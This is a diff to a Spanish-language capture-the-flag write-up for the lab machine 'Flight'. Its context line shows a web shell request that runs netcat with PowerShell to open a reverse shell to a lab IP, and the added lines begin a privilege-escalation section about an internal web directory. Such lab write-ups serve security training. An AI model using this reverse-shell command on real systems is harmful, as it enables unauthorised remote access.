@@ -198,3 +198,6 @@ ahora solo debemos cargar los dos archivos y luego podemos ejecutarlo desde la w
 `http://school.flight.htb/shell.php?cmd=netcat.exe -e powershell.exe 10.10.14.8 9001`
 ![[Pasted image 20240810145130.png]]
 
+### Escalada De privilegios
+una ves dentro de la maquina podemos ver el directorio `ìnetpub` este directorio es de un sitio web interno 
+![[Pasted image 20240810150156.png]]
